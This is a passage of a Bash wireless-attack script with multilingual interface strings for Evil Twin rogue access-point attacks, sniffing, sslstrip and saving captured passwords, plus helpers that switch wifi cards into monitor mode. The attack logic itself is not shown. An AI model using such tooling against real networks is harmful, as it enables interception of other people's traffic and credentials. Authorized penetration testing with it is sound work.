	arr["catalan",275]="A més dels requisits de software, que ja compleixes si has arribat fins aquí, cal proporcionar les dades de l'AP objectiu per dur a terme l'atac"
	arr["portuguese",275]="$pending_of_translation Além dos requisitos de software que já se encontram, se você chegar aqui, você precisa fornecer dados objetivos AP para realizar o ataque"

	arr["english",276]="On top of this screen you can see all that is needed to perform the attack. If any of the parameters has no value, you can enter it manually, or you can go back to select a target and then return here"
	arr["spanish",276]="En la parte superior de esta pantalla puedes ver todo lo que hace falta para realizar el ataque. Si alguno de los parámetros no tiene valor, puedes introducirlo manualmente, o puedes retroceder para seleccionar un objetivo y regresar aquí"
	arr["french",276]="Vous pouvez voir dans la partie supérieure de l'écran tout ce qui est nécessaire à l'attaque. Si l'un des paramètres est en blanc vous pouvez l'entrer manuellement ou bien vous pouvez revenir en arrière pour sélectionner une cible et revenir ici"
	arr["catalan",276]="A la part superior d'aquesta pantalla pots veure tot el que cal per realitzar l'atac. Si algun dels paràmetres no té valor, pots introduir-lo manualment, o pots retrocedir per a seleccionar un objectiu i tornar aquí"
	arr["portuguese",276]="$pending_of_translation No topo da tela você pode ver tudo o que é necessário para realizar o ataque. Se qualquer um dos parâmetros não tem nenhum valor, pode introduzi-lo manualmente, ou você pode voltar para selecionar um alvo e voltar aqui"

	arr["english",277]="Do you want to continue? "${normal_color}"[y/n]"
	arr["spanish",277]="¿Deseas continuar? "${normal_color}"[y/n]"
	arr["french",277]="Voulez-vous continuer? "${normal_color}"[y/n]"
	arr["catalan",277]="¿Vols continuar? "${normal_color}"[y/n]"
	arr["portuguese",277]="$pending_of_translation Você deseja continuar? "${normal_color}"[y/n]"

	arr["english",278]="Deauthentication chosen method: "${pink_color}"None"${normal_color}
	arr["spanish",278]="Método elegido de desautenticación: "${pink_color}"Ninguno"${normal_color}
	arr["french",278]="Méthode de dés-authentification: "${pink_color}"Aucun"${normal_color}
	arr["catalan",278]="Mètode elegit d'desautenticació: "${pink_color}"Ningú"${normal_color}
	arr["portuguese",278]="$pending_of_translation Método escolhido deauth: "${pink_color}"Nenhum"${normal_color}

	arr["english",279]="Select another interface with internet access :"
	arr["spanish",279]="Selecciona otra interfaz que tenga acceso a internet :"
	arr["french",279]="Choisissez une autre interface qui ait accès à internet :"
	arr["catalan",279]="Selecciona una altra interfície que tingui accés a internet :"
	arr["portuguese",279]="$pending_of_translation Selecione outra interface que tem acesso à internet :"

	arr["english",280]="On this screen, it's supposed an additional interface to provide internet access is chosen, but you don't have anyone at this moment"
	arr["spanish",280]="En esta pantalla, se supone que deberías elegir otro interfaz adicional para proporcionar acceso a internet, pero no dispones de ninguno en este momento"
	arr["french",280]="Sur cet écran vous êtes censé choisir une interface supplémentaire connectée à internet mais vous n'en avez pas en ce moment"
	arr["catalan",280]="En aquesta pantalla, se suposa que hauries de triar un altre interfície addicional per a proporcionar accés a internet, però no disposes de cap en aquest moment"
	arr["portuguese",280]="$pending_of_translation Nesta tela, você deveria escolher uma interface adicional para fornecer acesso à internet, mas não têm um neste momento"

	arr["english",281]="The interface $interface you have already selected is not a wifi card. This attack needs a wifi card selected"
	arr["spanish",281]="El interfaz $interface que tienes seleccionado no es una tarjeta wifi. Este ataque necesita que la interfaz seleccionada sea wifi"
	arr["french",281]="L'interface $interface que vous avez sélectionnée n'est pas une carte wifi. Cette attaque exige que l'interface sélectionnée soit une carte wifi"
	arr["catalan",281]="La interfície $interface que tens seleccionada no és una targeta wifi. Aquest atac necessita que la interfície seleccionada sigui wifi"
	arr["portuguese",281]="$pending_of_translation A interface $interface que você selecionou não é um cartão de wifi. Este ataque requer que a interface selecionada é wifi"

	arr["english",282]="Selected internet interface: "${pink_color}"$internet_interface"${normal_color}
	arr["spanish",282]="Interfaz con internet seleccionada: "${pink_color}"$internet_interface"${normal_color}
	arr["french",282]="Interface internet sélectionnée: "${pink_color}"$internet_interface"${normal_color}
	arr["catalan",282]="Interfície amb internet seleccionada: "${pink_color}"$internet_interface"${normal_color}
	arr["portuguese",282]="$pending_of_translation Interface da internet selecionado: "${pink_color}"$internet_interface"${normal_color}

	arr["english",283]="Selected internet interface: "${pink_color}"None"${normal_color}
	arr["spanish",283]="Interfaz con internet seleccionada: "${pink_color}"Ninguna"${normal_color}
	arr["french",283]="Interface internet sélectionnée: "${pink_color}"Aucun"${normal_color}
	arr["catalan",283]="Interfície amb internet seleccionat: "${pink_color}"Ningú"${normal_color}
	arr["portuguese",283]="$pending_of_translation Interface da internet selecionado: "${pink_color}"Nenhum"${normal_color}

	arr["english",284]="Do you want to use this selected interface? "${normal_color}"[y/n]"
	arr["spanish",284]="¿Quieres utilizar esta interfaz ya seleccionada? "${normal_color}"[y/n]"
	arr["french",284]="Souhaitez-vous utiliser l'interface déjà sélectionnée? "${normal_color}"[y/n]"
	arr["catalan",284]="¿Vols fer servir aquesta interfície ja seleccionada? "${normal_color}"[y/n]"
	arr["portuguese",284]="$pending_of_translation Você quer usar já estiver selecionada interface? "${normal_color}"[y/n]"

	arr["english",285]="Selected interface with internet access detected during this session ["${normal_color}"$internet_interface"${blue_color}"]"
	arr["spanish",285]="Se ha detectado que ya tiene un interfaz con acceso a internet seleccionada en esta sesión ["${normal_color}"$internet_interface"${blue_color}"]"
	arr["french",285]="Une interface avec accès à internet a déjà été sélectionné pour cette session ["${normal_color}"$internet_inferface"${blue_color}"]"
	arr["catalan",285]="S'ha detectat que ja té una interfície amb accés a internet seleccionada en aquesta sessió ["${normal_color}"$internet_inferface"${blue_color}"]"
	arr["portuguese",285]="$pending_of_translation Verificou-se já que tem uma interface com acesso à internet seleccionado nesta sessão ["${normal_color}"$internet_inferface"${blue_color}"]"

	arr["english",286]="The unique Evil Twin attack in which it's not necessary to have an additional interface with internet access is the captive portal attack"
	arr["spanish",286]="El único ataque de Evil Twin en el que no es necesario tener una interfaz adicional con acceso a internet es el del portal cautivo"
	arr["french",286]="La seule attaque Evil Twin pour laquelle il n'est pas nécessaire d'avoir une interface supplémentaire avec accès à internet est l'attaque portail captif"
	arr["catalan",286]="L'únic atac d'Evil Twin en què no cal tenir una interfície addicional amb accés a internet és el del portal captiu"
	arr["portuguese",286]="$pending_of_translation O único ataque Evil Twin em que não é necessário ter uma interface adicional com acesso à internet é o portal cativo"

	arr["english",287]="The script will check for internet access. Please be patient..."
	arr["spanish",287]="El script va a comprobar si tienes acceso a internet. Por favor ten paciencia..."
	arr["french",287]="Le script va vérifier que vous aillez accès à internet. Soyez patients s'il vous plaît..."
	arr["catalan",287]="El script comprovarà si tens accés a internet. Si us plau sigues pacient..."
	arr["portuguese",287]="$pending_of_translation O script irá verificar se você tem acesso à internet. Por favor, seja paciente..."

	arr["english",288]="It seems you have no internet access. This attack needs an interface with internet access"
	arr["spanish",288]="Parece que no tienes conexión a internet. Este ataque necesita una interfaz con acceso a internet"
	arr["french",288]="Il semble que vous ne pouvez pas vous connecter à internet. Cette attaque a besoin d'une interface avec u accès internet"
	arr["catalan",288]="Sembla que no tens connexió a internet. Aquest atac necessita una interfície amb accés a internet"
	arr["portuguese",288]="$pending_of_translation Parece que você não tem acesso à internet. Este ataque precisa de uma interface com acesso à internet"

	arr["english",289]="It has been verified successfully you have internet access on selected interface. Script can continue..."
	arr["spanish",289]="Se ha verificado correctamente que tienes acceso a internet en la interfaz seleccionada. El script puede continuar..."
	arr["french",289]="Confirmation de l'accès internet pour l'interface réseaux choisie. Le script peut continuer..."
	arr["catalan",289]="S'ha verificat correctament que tens accés a internet a la interfície seleccionada. El script pot continuar..."
	arr["portuguese",289]="$pending_of_translation Verificou-se com sucesso que você tem acesso à internet na interface selecionada. O script pode continuar..."

	arr["english",290]="It seems you have internet access but not in the selected interface acting as interface with internet access"
	arr["spanish",290]="Parece que tienes conexión a internet pero no en la interfaz seleccionada como interfaz con acceso a internet"
	arr["french",290]="Il semble bien que vous avez accès à internet mais pas avec l'interface sélectionnée à cet effet"
	arr["catalan",290]="Sembla que tens connexió a internet però no en la interfície seleccionada com a interfície amb accés a internet"
	arr["portuguese",290]="$pending_of_translation Parece que você tem internet, mas não na interface selecionada como uma interface com acesso à internet"

	arr["english",291]="Evil Twin AP attack with sniffing"
	arr["spanish",291]="Ataque Evil Twin AP con sniffing"
	arr["french",291]="Attaque Evil Twin avec capture de données"
	arr["catalan",291]="Atac Evil Twin AP amb sniffing"
	arr["portuguese",291]="$pending_of_translation Ataque Evil Twin AP com sniffing"

	arr["english",292]="Evil Twin AP attack with sniffing and sslstrip"
	arr["spanish",292]="Ataque Evil Twin AP con sniffing y sslstrip"
	arr["french",292]="Attaque Evil Twin avec capture de données et sslstrip"
	arr["catalan",292]="Atac Evil Twin AP amb sniffing i sslstrip"
	arr["portuguese",292]="$pending_of_translation Ataque Evil Twin AP com sniffing e sslstrip"

	arr["english",293]="Evil Twin AP attack with captive portal"
	arr["spanish",293]="Ataque Evil Twin AP con portal cautivo"
	arr["french",293]="Attaque Evil Twin avec portail captif"
	arr["catalan",293]="Atac Evil Twin AP amb portal captiu"
	arr["portuguese",293]="$pending_of_translation Ataque Evil Twin AP com portal cativo"

	arr["english",294]="Detecting resolution... Detected! : "${normal_color}"$resolution"
	arr["spanish",294]="Detectando resolución... Detectada! : "${normal_color}"$resolution"
	arr["french",294]="Détection de la résolution... Détectée! : "${normal_color}"$resolution"
	arr["catalan",294]="Detectant resolució... Detectada! : "${normal_color}"$resolution"
	arr["portuguese",294]="$pending_of_translation Detecção de resolução... Detectada! : "${normal_color}"$resolution"

	arr["english",295]="Detecting resolution... Can't be detected!, using standard : "${normal_color}"$resolution"
	arr["spanish",295]="Detectando resolución... No se ha podido detectar!, usando estándar : "${normal_color}"$resolution"
	arr["french",295]="Détection de la résolution... Impossible à détecter!, utilisation de la résolution : "${normal_color}"$resolution"
	arr["catalan",295]="Detectant resolució... No s'ha pogut detectar!, usant estàndard : "${normal_color}"$resolution"
	arr["portuguese",295]="$pending_of_translation Detectando resolução... Não foi possível detectar!, usando o padrão : "${normal_color}"$resolution"

	arr["english",296]="All parameters and requirements are set. The attack is going to start. Multiple windows will be opened, don't close anyone. When you want to stop the attack press Enter on this window and the script will automatically close them all"
	arr["spanish",296]="Todos los parámetros y requerimientos están listos. Va a comenzar el ataque. Se abrirán múltiples ventanas, no cierres ninguna. Cuando quieras parar el ataque pulsa Enter en esta ventana y el script cerrará automaticamente todo"
	arr["french",296]="Tous les paramètres de l'attaque sont prêts et elle peut comenmcer. Plusieurs consoles vont s'ouvrir, ne les fermez pas. Lorsque vous voulez arrêter l'attaque, appuyez sur Entrée dans cette console et le script fermera automatiquement les autres"
	arr["catalan",296]="Tots els paràmetres i requeriments estan preparats. Començarà l'atac. S'obriran múltiples finestres, no tanquis cap. Quan vulguis parar l'atac prem Enter en aquesta finestra i el script tancarà automàticament tot"
	arr["portuguese",296]="$pending_of_translation Todos os parâmetros e requisitos estão prontos. Você vai começar o ataque. várias janelas, não fechar qualquer aberto. Quando quiser parar o ataque pressione Enter nesta janela eo script irá fechar automaticamente todos"

	arr["english",297]="Cleaning iptables and routing rules"
	arr["spanish",297]="Limpiando iptables y reglas de routing"
	arr["french",297]="Effacement des règles de routage iptables"
	arr["catalan",297]="Netejant iptables i regles de routing"
	arr["portuguese",297]="$pending_of_translation Limpar iptables e regras de roteamento"

	arr["english",298]="Evil Twin attack has been started. Press Enter key on this window to stop it"
	arr["spanish",298]="El ataque Evil Twin ha comenzado. Pulse la tecla Enter en esta ventana para pararlo"
	arr["french",298]="L'attaque Evil Twin a commencé. Pressez la touche Entrée dans cette console pour l'arrêter"
	arr["catalan",298]="L'atac Evil Twin ha començat. Prem Enter a aquesta finestra per aturar-lo"
	arr["portuguese",298]="$pending_of_translation Evil Twin ataque começou. Pressione a tecla Enter nesta janela para parar"

	arr["english",299]="Restoring interface..."
	arr["spanish",299]="Restaurando interfaz..."
	arr["french",299]="Réinitialisation de l'interface..."
	arr["catalan",299]="Restablint interfície..."
	arr["portuguese",299]="$pending_of_translation Interface de restauração..."

	arr["english",300]="If make work xpdyinfo command, the script will be able to calculate your screen resolution and show you the windows in a better way. Depending of the system, the package name could be x11-utils, xdpyinfo, xorg-xdpyinfo, etc."
	arr["spanish",300]="Si haces que funcione en tu sistema el comando xdpyinfo, el script podrá calcular tu resolución de pantalla y mostrarte las ventanas de forma más optimizada. Dependiendo del sistema el paquete puede llamarse x11-utils, xdpyinfo, xorg-xdpyinfo, etc."
	arr["french",300]="Si la commande xdpyinfo est installée dans vôtre système le script pourra calculer votre résolution d'écran et optimiser l'affichage en conséquence. Le paquet à installer pour avoir cette commande s'appelle (selon la distribution) x11-utils, xdpyinfo, xorg-xdpyinfo, etc."
	arr["catalan",300]="Si fas que funcioni en el teu sistema l'ordre xdpyinfo, el script podrà calcular la teva resolució de pantalla i mostrar-te les finestres de forma més optimitzada. Depenent del sistema el paquet pot dir-se x11-utils, xdpyinfo, xorg-xdpyinfo, etc."
	arr["portuguese",300]="$pending_of_translation Se você fizer o comando xdpyinfo para trabalhar em seu sistema, o script irá calcular a sua resolução de tela e janelas de mostra de uma forma mais otimizada. Dependendo do sistema, o pacote pode ser chamado X11-utils, xdpyinfo, xorg-xdpyinfo, etc."

	arr["english",301]="Despite having all essential tools installed, your system uses airmon-zc instead of airmon-ng. In order to work properly you need to install lspci (pciutils) and you don't have it right now. Please, install it and launch the script again"
	arr["spanish",301]="A pesar de tener todas las herramientas esenciales instaladas, tu sistema usa airmon-zc en lugar de airmon-ng. Para poder funcionar necesitas tener instalado lspci (pciutils) y tú no lo tienes en este momento. Por favor, instálalo y vuelve a lanzar el script"
	arr["french",301]="En dépit d'avoir tous les outils essentiels installés votre système utilise airmon-zc au lieu de airmon-ng. Vous devez installer lspci (pciutils) que vous n'avez pas à ce moment. S'il vous plaît, installez-le et relancez le script"
	arr["catalan",301]="Tot i tenir totes les eines essencials instal·lades, el teu sistema fa servir airmon-zc en lloc del airmon-ng. Per poder funcionar necessites tenir instal·lat lspci (pciutils) i tu no el tens en aquest moment. Si us plau, instal·la-ho i torna a executar el script"
	arr["portuguese",301]="$pending_of_translation Apesar de ter todas as ferramentas essenciais instalado, o sistema utiliza airmon-zc vez de airmon-ng. Para funcionar você precisa instalar lspci (pciutils) e você não tem neste momento. Por favor, instale e execute o script novamente"

	arr["english",302]="Do you want to store in a file the sniffed captured passwords? "${blue_color}"If you answer no (\"n\") they will be only shown on screen "${normal_color}"[y/n]"
	arr["spanish",302]="¿Deseas guardar en un fichero las contraseñas obtenidas del sniffing? "${blue_color}"Si respondes que no (\"n\") solo se mostrarán por pantalla "${normal_color}"[y/n]"
	arr["french",302]="Voulez-vous enregistrer dans un fichier les mots de passe capturés? "${blue_color}"Si vous répondez non (\"n\"), ils seronts uniquements affichés à l'écran "${normal_color}"[y/n]"
	arr["catalan",302]="¿Vols guardar en un fitxer les contrasenyes obtingudes del sniffing? "${blue_color}"Si respons que no (\"n\") només es mostraran per pantalla "${normal_color}"[y/n]"
	arr["portuguese",302]="$pending_of_translation Você deseja manter senhas em um arquivo obtido a partir de cheirar? "${blue_color}"Se você responder não (\"n\") só será mostrado na tela "${normal_color}"[y/n]"

	arr["english",303]="Type the path to store the file or press Enter to accept the default proposal "${normal_color}"[$default_ettercap_logpath]"
	arr["spanish",303]="Escribe la ruta donde guardaremos el fichero o pulsa Enter para aceptar la propuesta por defecto "${normal_color}"[$default_ettercap_logpath]"
	arr["french",303]="Entrez le chemin où vous voulez enregistrer le fichier ou bien appuyez sur Entrée pour utiliser le chemin proposé "${normal_color}"[$default_ettercap_logpath]"
	arr["catalan",303]="Escriu la ruta on desarem el fitxer o prem Enter per acceptar la proposta per defecte "${normal_color}"[$default_ettercap_logpath]"
	arr["portuguese",303]="$pending_of_translation Digite o caminho onde armazenar o arquivo ou pressione Enter para aceitar as propostas padrão "${normal_color}"[$default_ettercap_logpath]"

	arr["english",304]="Parsing sniffer log..."
	arr["spanish",304]="Analizando log del sniffer.."
	arr["french",304]="Analyse du log de capture de données..."
	arr["catalan",304]="Analitzant log del sniffer..."
	arr["portuguese",304]="$pending_of_translation Sniffer log análise..."

	arr["english",305]="No passwords detected on sniffers's log. File will not be saved"
	arr["spanish",305]="No se ha encontrado ninguna contraseña en el log del sniffer. No se guardará el fichero"
	arr["french",305]="Aucun mot de passe détecté dans le log de capture. Le fichier ne sera pas sauvegardé"
	arr["catalan",305]="No s'ha trobat cap contrasenya en el log del sniffer. No es guarda el fitxer"
	arr["portuguese",305]="$pending_of_translation Ele não foi encontrado qualquer registo de senha sniffer. O arquivo não será salvo"

	arr["english",306]="Passwords captured by sniffer. File saved at "${normal_color}"[$ettercap_logpath]"
	arr["spanish",306]="El sniffer ha capturado contraseñas. Fichero salvado en "${normal_color}"[$ettercap_logpath]"
	arr["french",306]="Le sniffer a capturé des mots de passe. Fichier enregistré dans "${normal_color}"[$ettercap_logpath]"
	arr["catalan",306]="El sniffer ha capturat contrasenyes. Fitxer desat a "${normal_color}"[$ettercap_logpath]"
	arr["portuguese",306]="$pending_of_translation O sniffer capturou senhas. I arquivo salvo no "${normal_color}"[$ettercap_logpath]"

	case "$3" in
		"yellow")
			interrupt_checkpoint ${2} ${3}
			echo_yellow "${arr[$1,$2]}"
		;;
		"blue")
			echo_blue "${arr[$1,$2]}"
		;;
		"red")
			echo_red "${arr[$1,$2]}"
		;;
		"green")
			if [ ${2} -ne ${abort_question} ]; then
				interrupt_checkpoint ${2} ${3}
			fi
			echo_green "${arr[$1,$2]}"
		;;
		"pink")
			echo_pink "${arr[$1,$2]}"
		;;
		"title")
			generate_dynamic_line "${arr[$1,$2]}" "title"
		;;
		"read")
			interrupt_checkpoint ${2} ${3}
			read -p "${arr[$1,$2]}"
		;;
		"multiline")
			echo -ne "${arr[$1,$2]}"
		;;
		"hint")
			echo_brown "$hintvar "${pink_color}"${arr[$1,$2]}"
		;;
		"separator")
			generate_dynamic_line "${arr[$1,$2]}" "separator"
		;;
		"under_construction")
			echo_red_slim "${arr[$1,$2]} ($under_constructionvar)"
		;;
		*)
			if [ -z "$3" ]; then
				last_echo "${arr[$1,$2]}" ${normal_color}
			else
				declare -a argarray=("${!3}")
				special_text_missed_optional_tool $1 $2 argarray[@]
			fi
		;;
	esac
}

function interrupt_checkpoint() {

	if [ -z "$last_buffered_type1" ]; then
		last_buffered_message1=${1}
		last_buffered_message2=${1}
		last_buffered_type1=${2}
		last_buffered_type2=${2}
	else
		if [ ${1} -ne ${resume_message} ]; then
			last_buffered_message2=${last_buffered_message1}
			last_buffered_message1=${1}
			last_buffered_type2=${last_buffered_type1}
			last_buffered_type1=${2}
		fi
	fi
}

function special_text_missed_optional_tool() {

	declare -a required_tools=("${!3}")

	allowed_menu_option=1
	if [ ${debug_mode} -eq 0 ]; then
		tools_needed="${optionaltool_needed[$1]}"
		for item in ${required_tools[@]}; do
			if [ ${optional_tools[$item]} -eq 0 ]; then
				allowed_menu_option=0
				tools_needed+="$item "
			fi
		done
	fi

	if [ ${allowed_menu_option} -eq 1 ]; then
		last_echo "${arr[$1,$2]}" ${normal_color}
	else
		[[ ${arr[$1,$2]} =~ ^([0-9]+)\.(.*)$ ]] && forbidden_options+=("${BASH_REMATCH[1]}")
		tools_needed=${tools_needed:: -1}
		echo_red_slim "${arr[$1,$2]} ($tools_needed)"
	fi
}

function generate_dynamic_line() {

	local type=${2}
	if [ "$type" = "title" ]; then
		ncharstitle=78
		titlechar="*"
	elif [ "$type" = "separator" ]; then
		ncharstitle=58
		titlechar="-"
	fi

	titletext=${1}
	titlelength=${#titletext}
	finaltitle=""

	for ((i=0; i < ($ncharstitle/2 - $titlelength+($titlelength/2)); i++)); do
		finaltitle="$finaltitle$titlechar"
	done

	if [ "$type" = "title" ]; then
		finaltitle="$finaltitle $titletext "
	elif [ "$type" = "separator" ]; then
		finaltitle="$finaltitle ($titletext) "
	fi

	for ((i=0; i < ($ncharstitle/2 - $titlelength+($titlelength/2)); i++)); do
		finaltitle="$finaltitle$titlechar"
	done

	if [ $(($titlelength % 2)) -gt 0 ]; then
		finaltitle+="$titlechar"
	fi

	if [ "$type" = "title" ]; then
		echo_red "$finaltitle"
	elif [ "$type" = "separator" ]; then
		echo_blue "$finaltitle"
	fi
}

function check_to_set_managed() {

	check_interface_mode
	case "$ifacemode" in
		"Managed")
			echo
			language_strings ${language} 0 "yellow"
			language_strings ${language} 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings ${language} 1 "yellow"
			language_strings ${language} 115 "read"
			return 1
		;;
	esac
	return 0
}

function check_to_set_monitor() {

	check_interface_mode
	case "$ifacemode" in
		"Monitor")
			echo
			language_strings ${language} 10 "yellow"
			language_strings ${language} 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings ${language} 13 "yellow"
			language_strings ${language} 115 "read"
			return 1
		;;
	esac
	return 0
}

function check_monitor_enabled() {

	mode=`iwconfig ${interface} 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2`

	if [[ ${mode} != "Monitor" ]]; then
		echo
		language_strings ${language} 14 "yellow"
		language_strings ${language} 115 "read"
		return 1
	fi
	return 0
}

function check_interface_wifi() {

	execute_iwconfig_fix
	return $?
}

function execute_iwconfig_fix() {

	iwconfig_fix
	iwcmd="iwconfig $interface $iwcmdfix > /dev/null 2> /dev/null"
	eval ${iwcmd}

	return $?
}

function prepare_et_monitor() {

	disable_rfkill

	phy_iface=$(ls -l "/sys/class/net/$interface/phy80211" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/' 2> /dev/null)
	iface_phy_number=${phy_iface:3:1}
	iface_monitor_et_deauth="mon$iface_phy_number"

	iw phy ${phy_iface} interface add ${iface_monitor_et_deauth} type monitor 2> /dev/null
	ifconfig ${iface_monitor_et_deauth} up > /dev/null 2>&1
	iwconfig ${iface_monitor_et_deauth} channel ${channel} > /dev/null 2>&1
}

function prepare_et_interface() {

	et_initial_state=${ifacemode}

	if [ ${ifacemode} != "Managed" ]; then
		new_interface=$(${airmon} stop ${interface} 2> /dev/null | grep station)
		[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
		if [ "$interface" != "$new_interface" ]; then
			interface=${new_interface}
		fi
	fi
}

function restore_et_interface() {

	echo
	language_strings ${language} 299 "blue"

	disable_rfkill

	iw dev ${iface_monitor_et_deauth} del > /dev/null 2>&1

	if [ ${et_initial_state} = "Managed" ]; then
		ifconfig ${interface} down > /dev/null 2>&1
		iwconfig ${interface} mode managed > /dev/null 2>&1
		ifconfig ${interface} up > /dev/null 2>&1
	else
		new_interface=$(${airmon} start ${interface} 2> /dev/null | grep monitor)
		[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
		if [ "$interface" != "$new_interface" ]; then
			interface=${new_interface}
		fi
	fi
}

function disable_rfkill() {

	if hash rfkill 2> /dev/null; then
		rfkill unblock all > /dev/null 2>&1
	fi
}

function managed_option() {

	check_to_set_managed

	if [ "$?" != "0" ]; then
		return
	fi

	disable_rfkill

	language_strings ${language} 17 "blue"
	ifconfig ${interface} up

	new_interface=$(${airmon} stop ${interface} 2> /dev/null | grep station)
	[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"

	if [ "$interface" != "$new_interface" ]; then
		echo
		language_strings ${language} 15 "yellow"
		interface=${new_interface}
	fi

	echo
	language_strings ${language} 16 "yellow"
	language_strings ${language} 115 "read"
}

function monitor_option() {

	check_to_set_monitor

	if [ "$?" != "0" ]; then
		return
	fi

	disable_rfkill

	language_strings ${language} 18 "blue"

	ifconfig ${interface} up
	iwconfig ${interface} rate 1M > /dev/null 2>&1

	if [ "$?" != "0" ]; then
		echo
		language_strings ${language} 20 "yellow"
		language_strings ${language} 115 "read"
		return
	fi

	if [ ${check_kill_needed} -eq 1 ]; then
		language_strings ${language} 19 "blue"
		${airmon} check kill > /dev/null 2>&1
		nm_processes_killed=1
	fi

	new_interface=$(${airmon} start ${interface} 2> /dev/null | grep monitor)
	[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"

	if [ "$interface" != "$new_interface" ]; then
		echo
		language_strings ${language} 21 "yellow"
		interface=${new_interface}
	fi

	echo
	language_strings ${language} 22 "yellow"
	language_strings ${language} 115 "read"
}

function check_interface_mode() {

	execute_iwconfig_fix
	if [[ "$?" != "0" ]]; then
		ifacemode="(Non wifi card)"
		return 0
	fi

	modemanaged=`iwconfig ${interface} 2> /dev/null | grep Mode: | cut -d ':' -f 2 | cut -d ' ' -f 1`

	if [[ ${modemanaged} = "Managed" ]]; then
		ifacemode="Managed"
		return 0
	fi

	modemonitor=`iwconfig ${interface} 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2`

	if [[ ${modemonitor} = "Monitor" ]]; then
		ifacemode="Monitor"
		return 0
	fi

	language_strings ${language} 23 "yellow"
	language_strings ${language} 115 "read"
	exit_code=1
	exit_script_option
}

function language_menu() {

	clear
	language_strings ${language} 87 "title"
	current_menu="language_menu"
	initialize_menu_and_print_selections
	echo
	language_strings ${language} 81 "green"
	print_simple_separator
	language_strings ${language} 79
	language_strings ${language} 80
	language_strings ${language} 113
	language_strings ${language} 116
	language_strings ${language} 249
	print_hint ${current_menu}

	read language_selected
	echo
	case ${language_selected} in
		1)
			if [ "$language" = "english" ]; then
				language_strings ${language} 251 "yellow"
			else
				language="english"
				language_strings ${language} 83 "yellow"
			fi
			language_strings ${language} 115 "read"
		;;
		2)
			if [ "$language" = "spanish" ]; then
				language_strings ${language} 251 "yellow"
			else
				language="spanish"
				language_strings ${language} 84 "yellow"
			fi
			language_strings ${language} 115 "read"
		;;
		3)
			if [ "$language" = "french" ]; then
				language_strings ${language} 251 "yellow"
			else
				language="french"
				language_strings ${language} 112 "yellow"
			fi
			language_strings ${language} 115 "read"
		;;
		4)
			if [ "$language" = "catalan" ]; then
				language_strings ${language} 251 "yellow"
			else
				language="catalan"
				language_strings ${language} 117 "yellow"
			fi
			language_strings ${language} 115 "read"
		;;
		5)
			if [ "$language" = "portuguese" ]; then
				language_strings ${language} 251 "yellow"
			else
				language="portuguese"
				language_strings ${language} 248 "yellow"
			fi
			language_strings ${language} 115 "read"
		;;
		*)
			invalid_language_selected
		;;
	esac
}

function set_chipset() {

	chipset=""
	sedrule1="s/^....//"
	sedrule2="s/ Network Connection//g"
	sedrule3="s/ Wireless Adapter//"
	sedrule4="s/Wireless LAN Controller //g"
	sedrule5="s/ Wireless Adapter//"
	sedrule6="s/^ //"
	sedrule7="s/ Gigabit Ethernet.*//"
	sedrule8="s/ Fast Ethernet.*//"
	sedrule9="s/ \[.*//"
	sedrule10="s/ (.*//"

	sedrulewifi="$sedrule1;$sedrule2;$sedrule3;$sedrule6"
	sedrulegeneric="$sedrule4;$sedrule2;$sedrule5;$sedrule6;$sedrule7;$sedrule8;$sedrule9;$sedrule10"
	sedruleall="$sedrule1;$sedrule2;$sedrule3;$sedrule6;$sedrule7;$sedrule8;$sedrule9;$sedrule10"

	if [ -f /sys/class/net/${1}/device/modalias ]; then

		bus_type=$(cat /sys/class/net/${1}/device/modalias | cut -d ":" -f 1)

		if [ "$bus_type" = "usb" ]; then
			vendor_and_device=$(cat /sys/class/net/${1}/device/modalias | cut -d ":" -f 2 | cut -b 1-10 | sed 's/^.//;s/p/:/')
			chipset=$(lsusb | grep -i "$vendor_and_device" | head -n1 - | cut -f3- -d ":" | sed "$sedrulewifi")

		elif [[ "$bus_type" =~ pci|ssb|bcma|pcmcia ]]; then

			if [[ -f /sys/class/net/${1}/device/vendor && -f /sys/class/net/${1}/device/device ]]; then
				vendor_and_device=$(cat /sys/class/net/${1}/device/vendor):$(cat /sys/class/net/${1}/device/device)
				chipset=$(lspci -d ${vendor_and_device} | cut -f3- -d ":" | sed "$sedrulegeneric")
			else
				if hash ethtool 2> /dev/null; then
					ethtool_output="$(ethtool -i ${1} 2>&1)"
					vendor_and_device=$(printf "$ethtool_output" | grep bus-info | cut -d ":" -f "3-" | sed 's/^ //')
					chipset=$(lspci | grep "$vendor_and_device" | head -n1 - | cut -f3- -d ":" | sed "$sedrulegeneric")
				fi
			fi
		fi
	elif [[ -f /sys/class/net/${1}/device/idVendor && -f /sys/class/net/${1}/device/idProduct ]]; then
		vendor_and_device=$(cat /sys/class/net/${1}/device/idVendor):$(cat /sys/class/net/${1}/device/idProduct)
		chipset=$(lsusb | grep -i "$vendor_and_device" | head -n1 - | cut -f3- -d ":" | sed "$sedruleall")
	fi
}

function select_internet_interface() {

	if [ ${return_to_et_main_menu} -eq 1 ]; then
		return
	fi

	current_menu="evil_twin_attacks_menu"
	clear
	case ${et_mode} in
		"et_onlyap")
			language_strings ${language} 270 "title"
		;;
		"et_sniffing")
			language_strings ${language} 291 "title"
		;;
		"et_sniffing_sslstrip")
			language_strings ${language} 292 "title"
		;;
	esac

	inet_ifaces=`ip link | egrep "^[0-9]+" | cut -d ':' -f 2 | awk {'print $1'} | grep lo -v | grep ${interface} -v`

	option_counter=0
	for item in ${inet_ifaces}; do

		if [ ${option_counter} -eq 0 ]; then
			language_strings ${language} 279 "green"
			print_simple_separator
		fi

		option_counter=$[option_counter + 1]
		if [ ${#option_counter} -eq 1 ]; then
			spaceiface="  "
		else
			spaceiface=" "
		fi
		set_chipset ${item}
		echo -ne "$option_counter.$spaceiface$item "
		if [ "$chipset" = "" ]; then
			language_strings ${language} 245 "blue"
		else
			echo -e ${blue_color}"// "${yellow_color}"Chipset:"${normal_color}" $chipset"
		fi
	done

	if [ ${option_counter} -eq 0 ]; then
		return_to_et_main_menu=1
		echo
		language_strings ${language} 280 "yellow"
